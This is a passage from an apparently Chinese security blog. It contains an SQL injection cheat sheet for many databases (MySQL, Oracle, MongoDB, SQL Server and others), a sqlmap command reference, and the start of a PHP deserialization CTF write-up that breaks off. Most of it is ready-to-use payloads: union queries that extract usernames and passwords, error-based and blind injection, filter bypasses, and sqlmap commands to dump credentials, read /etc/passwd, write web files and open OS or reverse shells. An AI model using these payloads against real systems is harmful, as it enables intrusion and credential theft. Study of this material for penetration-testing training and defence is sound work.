<p>比如在这个网站,我们猜出列表个数有八个,表名为news(只是演示,一般猜解管理员的表,如admin)<img src="/image/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/image-20210606182256848.png" alt="image-20210606182256848"></p>
<p>通过图片我们可以看出显示出了3,4,8个位置,<strong>这时我们只需要在这三个中的任一位置进行替代，替代为猜测的列名即可</strong></p>
<p>比如在3的位置替代为password,若检测存在password这个列表，则会显示出来password明文</p>
<p><strong>偏移注入：表名获取到了（字典），但列名没获取到</strong></p>
<p>参考：<a href="https://blog.csdn.net/wxh0000mm/article/details/104451163">Access偏移注入与原理</a></p>
<p>最后查看网页源码即可</p>
<h1 id="MYSQL数据库注入"><a href="#MYSQL数据库注入" class="headerlink" title="MYSQL数据库注入"></a>MYSQL数据库注入</h1><h2 id="Phase-1-通用注入语法"><a href="#Phase-1-通用注入语法" class="headerlink" title="Phase 1: 通用注入语法"></a>Phase 1: 通用注入语法</h2><p><strong>注释符号：</strong><code>--+</code>或者<code>#</code></p>
<p><strong>猜解列表个数</strong>：<code>order by 5;</code> -&gt; 按第五列排列，而数字表示第几个column，所以如果<code>order by 5</code>显示正常，但<code>order by 6;</code>不正常，说明这个table只有6个column.</p>
<p><strong>猜解表名：</strong><code>union select 1,2,3,4,5 </code>;</p>
<p>不同于Access数据库，这里可能看不到报错的数字，所以得在前面参数处报错 如<code>.php?id=-1</code> 或者 <code>.php?id=1 and 1=2</code>或者试试换id</p>
<p><strong>在报错的数字位置替换：</strong></p>
<ul>
<li>查询数据库名: database()</li>
<li>查询数据库版本：version()</li>
<li>查询数据库用户：user()</li>
<li>查询操作系统: @@version_compile_os</li>
</ul>
<p><strong>堆叠注入绕过关键词检测：</strong></p>
<ul>
<li>‘; SET @a=HEX;prepare execsql from @a; execute execsql; </li>
</ul>
<p>若数据库名有特殊符号如(){}之类的，可以用``反引号将其扩出来</p>
<h2 id="Phase-2-根据版本继续注入"><a href="#Phase-2-根据版本继续注入" class="headerlink" title="Phase 2: 根据版本继续注入"></a>Phase 2: 根据版本继续注入</h2><h3 id="MYSQL-5-0以上版本："><a href="#MYSQL-5-0以上版本：" class="headerlink" title="MYSQL 5.0以上版本："></a>MYSQL 5.0以上版本：</h3><p><strong>information_schema.schemata</strong></p>
<ul>
<li>shcema_name 为数据库名信息</li>
</ul>
<p><strong>information_schema.tables</strong></p>
<ul>
<li>table_name 为表名信息</li>
<li>table_schema 为数据库名</li>
</ul>
<p><strong>information_schema.columns</strong></p>
<ul>
<li>column_name 为列名信息</li>
<li>table_name为表名信息</li>
</ul>
<p><strong>查表名:</strong></p>
<p><code>and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;--+</code> </p>
<p><strong>p.s:group_concat(table_name)意思说把所有表名获取出来</strong></p>
<p><strong>查列名：</strong></p>
<p><code>and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;--+</code></p>
<p><strong>查数据(指定表名列名)：</strong></p>
<p><code>union select 1,name,password,4 from StormGroup_member--+</code></p>
<p><code>union select 1,group_concat(concat_ws(&#39;:&#39;,name,password)),3,4 from StormGroup_member--+</code></p>
<p><code>union select 1,group_concat(name),group_concat(password),3,4 from StormGroup_member--+</code></p>
<h3 id="MYSQL-5-0以下版本："><a href="#MYSQL-5-0以下版本：" class="headerlink" title="MYSQL 5.0以下版本："></a>MYSQL 5.0以下版本：</h3><p>可进行暴力猜解、配合文件读取尝试获取列名表名</p>
<p>MYSQL 4.0: 读取源代码</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>####正则注入</p>
<p>正确返回1，错误返回0，可搭配if使用</p>
<p><code>select user() regexp &#39;^[a-z]&#39;; -- 猜解第一个字符，为r</code></p>
<p><code>select user() regexp &#39;^r[a-z]&#39;; -- 猜解第二个字符，为o</code></p>
<p><code>select user() regexp &#39;^ro[a-z]&#39;; -- 猜解第三个字符，为o</code></p>
<p><code>select user() regexp &#39;^roo[a-z]&#39;; -- 猜解第四个字符，为t</code></p>
<p><code>...</code></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>数据库需要开启报错提示</p>
<h4 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h4><p><code>select 1,count(*),concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a %23</code></p>
<p><strong>关键表被禁用：</strong></p>
<p><code>select 1,count(*),concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(rand(0)*2))a from (select null)b group by a %23;</code></p>
<p><strong>rand被禁用：</strong>可使用用户变量来报错</p>
<p><code>select min(@a:=1) from information_schema.tables group by concat(user(),@a:=(@a+1)%2);</code></p>
<p><strong>补充floor()报错注入原理：待续</strong></p>
<h4 id="UpdateXML-报错注入"><a href="#UpdateXML-报错注入" class="headerlink" title="UpdateXML 报错注入"></a>UpdateXML 报错注入</h4><ul>
<li><p>适用于mysql5.1.5+,最长32位</p>
</li>
<li><p>updatexml(a,<strong>b</strong>,c); </p>
<ul>
<li>a: XML文档对象的名称-&gt;string</li>
<li><strong>b: Xpath格式的string,若不符合该格式则报错</strong></li>
<li>c: new value -&gt; String</li>
</ul>
</li>
</ul>
<p><code>and updatexml(1,concat(0x7e,(payload)),1);</code></p>
<h4 id="Extractvalue-报错注入"><a href="#Extractvalue-报错注入" class="headerlink" title="Extractvalue 报错注入"></a>Extractvalue 报错注入</h4><ul>
<li>适用于mysql5.1.5+,最长32位</li>
<li>ExtractValue(xml_flag, <strong>xpath_expr</strong>)<ul>
<li>xml_flag: 传入目标xml文档</li>
<li><strong>xpath_expr</strong>: <strong>Xpath格式的查找路径，若不符合该格式则报错</strong></li>
<li>用法：获取xml_flag这个文档下xpath_expr里的东西</li>
</ul>
</li>
</ul>
<p><code>and extractvalue(1,concat(0x7e,(payload)))</code></p>
<h1 id="PostgreSQL注入（一般和PHP搭配）"><a href="#PostgreSQL注入（一般和PHP搭配）" class="headerlink" title="PostgreSQL注入（一般和PHP搭配）"></a>PostgreSQL注入（一般和PHP搭配）</h1><p>参考：<a href="https://www.cnblogs.com/she11s/p/12326629.html">Sql注入之Postgresql</a></p>
<p><strong>PostgreSQL注入和MYSQL很像，只是语句有些不同</strong></p>
<p><strong>判断：and 1=1 and 1=2</strong></p>
<p><strong>回显位置：union select null, ‘1’,’1’,null</strong></p>
<p><strong>查询表名、列名的时候每次只会显示一个，所以可以在后面加上 <code>limit 1 offset 0</code> ，通过增加offset可以依次得到剩下的表名、列名</strong></p>
<h1 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>sqlite中会有一个隐藏表 <strong>sqlite_master</strong></p>
<h2 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h2><p><strong>查询列表个数</strong>：<code>order by 4</code></p>
<p><strong>获取表的信息</strong>：<code>union select 1,name,sql,4 from sqlite_master</code></p>
<p><code>sql</code>是数据库被创建时的执行语句</p>
<p><strong>获取数据：</strong><code>union select 1,name,password,4 from 获取的表名</code></p>
<h1 id="Db2注入"><a href="#Db2注入" class="headerlink" title="Db2注入"></a>Db2注入</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p><strong>tabschema</strong>：数据库名 </p>
<p><strong>current schema</strong>：数据库名的列名</p>
<p><strong>table_name</strong>：表名 </p>
<p><strong>tabname</strong>：表名的列名</p>
<p><strong>column_name</strong>：列名的列名</p>
<p><strong>sysibm.sysdummy1</strong> 记录数据库名的信息</p>
<p><strong>syscat.tables</strong>：记录表名的信息</p>
<p><strong>sysibm.columns</strong>：记录列名的信息</p>
<h2 id="注入语法-1"><a href="#注入语法-1" class="headerlink" title="注入语法"></a>注入语法</h2><p><strong>1、猜数</strong></p>
<p><code>order by 4</code></p>
<p><code>union select 1,2,3,4 from sysibm.systables</code></p>
<p><strong>2、爆库：</strong></p>
<p><code>union select 1,2,current schema,4 from sysibm.sysdummy1</code></p>
<p><strong>3、爆表：</strong></p>
<p><code>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 0,1</code></p>
<p><code>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 1,1</code></p>
<p><strong>4、爆列：</strong></p>
<p><code>union select 1,2,column_name,4 from sysibm.columns where table_schema=current schema and table_name=&#39;GAME_CHARACTER&#39; limit 0,1</code></p>
<p><strong>5、爆数据：</strong></p>
<p><code>union select 1,name,password,4 from GAME_CHARACTER limit 0,1</code></p>
<p><code>union select 1,name,password,4 from GAME_CHARACTER limit 1,1</code></p>
<h1 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p><strong>参考：</strong></p>
<p><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html"><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结</a></a></p>
<p><a href="https://blog.csdn.net/qq_35569814/article/details/100517122">Oracle注入</a></p>
<p><strong>all_tables</strong> 查询出所有的表</p>
<p><strong>user_tables</strong> 查询出当前用户的表</p>
<p><strong>all_tab_columns</strong> 查询出所有的字段</p>
<p><strong>user_tab_columns</strong>  查询出当前用户的字段</p>
<p><strong>v$version</strong> 查版本</p>
<p><strong>大小写:在Oracle中： 双引号的作用是：假如建立对象的时候，对象名、字段名加双引号，则示意Oracle将严格区分大小写，否则Oracl都默认大写。 而单引号则示意：这个加了单引号的字段是一个字类似字符串，并不区分大小写。 当指定字符串文本时，必须用单引号将字符串文本引住</strong></p>
<p><strong>注释符号：–</strong></p>
<h2 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h2><p><strong>1.查询个数</strong></p>
<p>order by 2</p>
<p><strong>2.查询表名格式</strong></p>
<p><code>union select null,null from dual</code></p>
<p><code>union select &#39;null&#39;,null from dual</code></p>
<p><code>union select &#39;null&#39;,&#39;null&#39; from dual</code></p>
<p><strong>3.查询获取表名(筛选,搜索)</strong></p>
<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1) from dual</code></p>
<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1) from dual</code></p>
<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1 and table_name not in &#39;LOGMNR_SESSION_EVOLVE$&#39;) from dual</code></p>
<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1 and table_name like &#39;%user%&#39;) from dual</code></p>
<p><strong>4.查询获取列名</strong></p>
<p><code>union select &#39;1&#39;,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;sns_users&#39;) from dual</code></p>
<p><code>union select &#39;1&#39;,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;sns_users&#39; and column_name not in &#39;USER_NAME&#39;)  from dual</code></p>
<p><strong>5.获取指定表名列名数据</strong></p>
<p><code>union select user_name,user_pwd from &quot;sns_users&quot;</code></p>
<p><code>union select user_name,user_pwd from &quot;sns_users&quot; where user_name&lt;&gt;&#39;hu&#39;</code></p>
<p><code>union select user_name,user_pwd from &quot;sns_users&quot; where user_name=&#39;mozhe&#39;</code></p>
<h1 id="Mongodb注入"><a href="#Mongodb注入" class="headerlink" title="Mongodb注入"></a>Mongodb注入</h1><h2 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h2><p>Mongodb以json形式传参，所以注入的时候需要根据code来分析</p>
<h2 id="注入语法-2"><a href="#注入语法-2" class="headerlink" title="注入语法"></a>注入语法</h2><p><strong>1.获取回显数字</strong></p>
<p><code>&#39;&#125;); return (&#123;title:1,content:&#39;2</code></p>
<p><strong>2.爆库</strong></p>
<p>db返回的是数组，库名，需要用tojson转换为字符串</p>
<p><code>&#39;&#125;); return (&#123;title:tojson(db),content:&#39;2</code></p>
<p><strong>3.爆表</strong></p>
<p>db.getCollectionNames()返回的是数组，需要用tojson转换为字符串</p>
<p><code>&#39;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#39;2</code></p>
<p><strong>4.爆列及数据</strong></p>
<p><strong>db.Authority_confidential</strong>是当前用的集合（表），</p>
<p>find函数用于查询，0是第一条数据</p>
<p><code>&#39;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1</code></p>
<p><code>&#39;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[1]),content:&#39;1</code></p>
<h1 id="Sybase-Sqlserver注入"><a href="#Sybase-Sqlserver注入" class="headerlink" title="Sybase/Sqlserver注入"></a>Sybase/Sqlserver注入</h1><p><strong>1.猜个数</strong></p>
<p><code>order by 4</code></p>
<p><strong>2.猜显位</strong>: <strong>改的位置显示正常则说明该位置为显位</strong></p>
<p><code>union all select &#39;null&#39;,null,null,null</code></p>
<p><code>union all select null,&#39;null&#39;,null,null 显示null证明显示位为2</code></p>
<p><code>union all select null,null,&#39;null&#39;,null</code></p>
<p><code>union all select null,null,null,&#39;null&#39;</code></p>
<p><strong>3.猜库名</strong></p>
<p><code>union all select null,db_name(),null,null</code></p>
<p><code>union all select null,db_name(1),null,null</code></p>
<p><code>union all select null,db_name(2),null,null</code></p>
<p><strong>4.猜表名</strong>：<strong>在数据库名后加上.dbo.sysobjects</strong></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects</code></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;&#39;Deepthroat_login&#39;</code></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;&#39;Deepthroat_login&#39; and name&lt;&gt;&#39;notice&#39;</code></p>
<p><strong>5.猜列名</strong></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.syscolumns where id=object_id(&#39;Deepthroat_login&#39;)</code></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat..syscolumns where id=object_id(&#39;Deepthroat_login&#39;) and name&lt;&gt;&#39;id&#39;</code></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat..syscolumns where id=object_id(&#39;Deepthroat_login&#39;) and name&lt;&gt;&#39;id&#39; and name&lt;&gt;&#39;name&#39;</code></p>
<p><strong>6.获取数据</strong></p>
<p><code>union all select null,name,null,null from Deepthroat_login</code></p>
<p><code>union all select null,password,null,null from Deepthroat_login</code></p>
<p><code>union all select null,password,null,null from Deepthroat_login where name&lt;&gt;&#39;zhang&#39;</code></p>
<p><code>union all select null,password,null,null from Deepthroat_login where name=&#39;mozhe&#39;</code></p>
<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><h2 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h2><p>-u  #注入点 </p>
<p>-f  #指纹判别数据库类型 </p>
<p>-b  #获取数据库版本信息 </p>
<p>-p  #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) </p>
<p>-D “”  #指定数据库名 </p>
<p>-T “”  #指定表名 </p>
<p>-C “”  #指定字段 </p>
<p>-s “”  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) </p>
<p>-r post.txt #把post的内容放在post.txt 直接用这个进行post注入</p>
<p>–level=(1-5) #要执行的测试水平等级，默认为1 </p>
<p>–risk=(0-3)  #测试执行的风险等级，默认为1 </p>
<p>–time-sec=(2,5) #延迟响应，默认为5 </p>
<p>–data “” #通过POST发送数据 </p>
<p>–columns        #列出字段 </p>
<p>–current-user   #获取当前用户名称 </p>
<p>–current-db     #获取当前数据库名称 </p>
<p>–users          #列数据库所有用户 </p>
<p>–passwords      #数据库用户所有密码 </p>
<p>–privileges     #查看用户权限(–privileges -U root) </p>
<p>-U               #指定数据库用户 </p>
<p>–dbs            #列出所有数据库 </p>
<p>–tables -D “”   #列出指定数据库中的表 </p>
<p>–columns -T “user” -D “mysql”#列出mysql数据库中的user表的所有字段</p>
<p>–dump-all            #列出所有数据库所有表 </p>
<p>–exclude-sysdbs      #只列出用户自己新建的数据库和表 </p>
<p>–dump -T “” -D “” -C “”   #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) </p>
<p>–dump -T “” -D “” –start 2 –top 4  # 列出指定数据库的表的2-4字段的数据 </p>
<p>–dump -C “ “ #列出指定column的字段</p>
<p>–dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </p>
<p>–os      #指定系统(Linux,Windows) </p>
<p>-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </p>
<p>​    1：显示信息和警告消息。 </p>
<p>​    2：显示调试消息。 </p>
<p>​    3：有效载荷注入。 </p>
<p>​    4：显示HTTP请求。 </p>
<p>​    5：显示HTTP响应头。 </p>
<p>​    6：显示HTTP响应页面的内容 </p>
<p>–privileges  #查看权限 </p>
<p>–is-dba      #是否是数据库管理员 </p>
<p>–roles       #枚举数据库用户角色 </p>
<p>–udf-inject  #导入用户自定义函数（获取系统权限） </p>
<p>–union-check  #是否支持union 注入 </p>
<p>–union-cols #union 查询表记录 </p>
<p>–union-test #union 语句测试 </p>
<p>–union-use  #采用union 注入 </p>
<p>–union-tech orderby #union配合order by </p>
<p>–data “” #POST方式提交数据(–data “page=1&amp;id=2”) </p>
<p>–cookie “用;号分开”      #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) –referer “”     #使用referer欺骗(–referer “http://“) </p>
<p>–user-agent “”  #自定义user-agent </p>
<p>–proxy “<a href="http://127.0.0.1:8118&quot;">http://127.0.0.1:8118&quot;</a> #代理注入 </p>
<p>–string=””    #指定关键词,字符串匹配. </p>
<p>–threads 　　  #采用多线程(–threads 3) </p>
<p>–sql-shell    #执行指定sql命令 </p>
<p>–sql-query    #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1” ) </p>
<p>–file-read    #读取指定文件 </p>
<p>–file-write   #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </p>
<p>–file-dest    #要写入的文件绝对路径 </p>
<p>–os-cmd=id    #执行系统命令 </p>
<p>–os-shell     #系统交互shell </p>
<p>–os-pwn       #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/) </p>
<p>–msf-path=    #matesploit绝对路径(–msf-path=/opt/framework/msf3/) </p>
<p>–os-smbrelay  # </p>
<p>–os-bof       # </p>
<p>–reg-read     #读取win系统注册表 </p>
<p>–priv-esc     # </p>
<p>–time-sec=    #延迟设置 默认–time-sec=5 为5秒 -p “user-agent” –user-agent “sqlmap/0.7rc1 (<a href="http://sqlmap.sourceforge.net)&quot;/">http://sqlmap.sourceforge.net)&quot;</a>  #指定user-agent注入 </p>
<p>–eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </p>
<p>common-outputs.txt </p>
<p>common-tables.txt      表字典 </p>
<p>keywords.txt </p>
<p>oracle-default-passwords.txt </p>
<p>user-agents.txt </p>
<p>wordlist.txt </p>
<h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句 :"></a>常用语句 :</h2><p>1./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db –users –passwords –dbs -v 0 </p>
<p>2./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –passwords -U root –union-use -v 2 </p>
<p>3./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2 </p>
<p>4./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -C “user,pass”  -v 1 –exclude-sysdbs </p>
<p>5./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –sql-shell -v 2 </p>
<p>6./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-read “c:\boot.ini” -v 2 </p>
<p>7./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-write /test/test.txt –file-dest /var/www/html/1.txt -v 2 </p>
<p>8./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-cmd “id” -v 1 </p>
<p>9./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-shell –union-use -v 2 </p>
<p>10./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path=/opt/framework/msf3 –priv-esc -v 1 </p>
<p>11./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path=/opt/framework/msf3 -v 1 </p>
<p>12./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-bof –msf-path=/opt/framework/msf3 -v 1 </p>
<p>13./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –reg-add –reg-key=”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1 </p>
<p>14./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –eta </p>
<p>15./sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</a> -p id –prefix “‘)” –suffix “AND (‘abc’=’abc”16./sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</a> –auth-type Basic –auth-cred “testuser:testpass”17./sqlmap.py -l burp.log –scope=”(www)?.target.(com|net|org)”18./sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</a> –tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </p>
<p>19./sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</a> –sql-query “SELECT ‘foo’” -v 1 </p>
<p>20./sqlmap.py -u “<a href="http://192.168.136.129/mysql/get_int_4.php?id=1&quot;">http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</a> –common-tables -D testdb –banner </p>
<p>21./sqlmap.py -u “<a href="http://192.168.136.129/mysql/get_int_4.php?id=1&quot;">http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</a> –cookie=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low” –string=’xx’ –dbs –level=3 -p “uid”简单的注入流程 :</p>
<p>1.读取数据库版本，当前用户，当前数据库 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db -v 1 </p>
<p>2.判断当前数据库用户权限 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –privileges -U 用户名 -v 1 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –is-dba -U 用户名 -v 1 </p>
<p>3.读取所有数据库用户或指定数据库用户的密码 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –users –passwords -v 2 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –passwords -U root -v 2 </p>
<p>4.获取所有数据库 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dbs -v 2 </p>
<p>5.获取指定数据库中的所有表 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –tables -D mysql -v 2 </p>
<p>6.获取指定数据库名中指定表的字段 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –columns -D mysql -T users -v 2 </p>
<p>7.获取指定数据库名中指定表中指定字段的数据 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2 </p>
<p>8.file-read读取web文件 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-read “/etc/passwd” -v 2 </p>
<p>9.file-write写入文件到web </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-write /localhost/mm.php –file使用sqlmap绕过防火墙进行注入测试：</p>
<h2 id="Tamper使用"><a href="#Tamper使用" class="headerlink" title="Tamper使用"></a>Tamper使用</h2><p>参考：<a href="https://www.cnblogs.com/mark0/p/12349551.html">sqlmap之常用tamper脚本</a></p>
<p><a href="https://blog.csdn.net/qq_21500173/article/details/53648696">sqlmap 的源码学习笔记一之目录结构</a></p>
<p><strong>–tamper=xxxx.py</strong> </p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>–current-user 当前用户<br>–is-dba 是否为管理员<br>–file-read 从服务器读入<br>–file-write 从本地写入<br>–file-dest 写入目标路径<br>–sql-shell 执行 sql命令终端<br>–os-shell 执行 shell终端<br>–os-cmd=ver 自定义命令<br>–os-cmd=OSCMD//执行操作系统命令<br>–os-shell //反弹一个 osshell<br>–os-pwn //pwn，反弹 msf下的 shell或者 vnc<br>–os-smbrelay //反弹 msf下的 shell或者 vnc<br>–os-bof //存储过程缓存溢出<br>–priv-esc //数据库提权<br>–reg-read –reg-add –reg-del –reg-key<br>–reg-value –reg-data –reg-type<br>python sqlmap.py -u “<a href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –file-read “d:/test.txt”<br>python sqlmap.py -u “<a href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –file-write “f:/host.txt” –file-dest “D:/phpstudy/PHPTutorial/WWW/sqlilabs/1.txt” <strong>第一个write是本地的内容，第二个是destination的地址</strong><br>python sqlmap.py -u “<a href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –sql-shell<br>select * from mysql.user<br>python sqlmap.py -u “<a href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –os-shell</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020青龙组AreUSerialz php反序列化漏洞 Write-up</title>
    <url>/2021/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Write-up/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞不难，但是在绕过方面的小<strong>Tip</strong>很值得学习，所以写这篇文章来记录一下。<a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz">靶场地址</a></p>
<span id="more"></span>

<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span 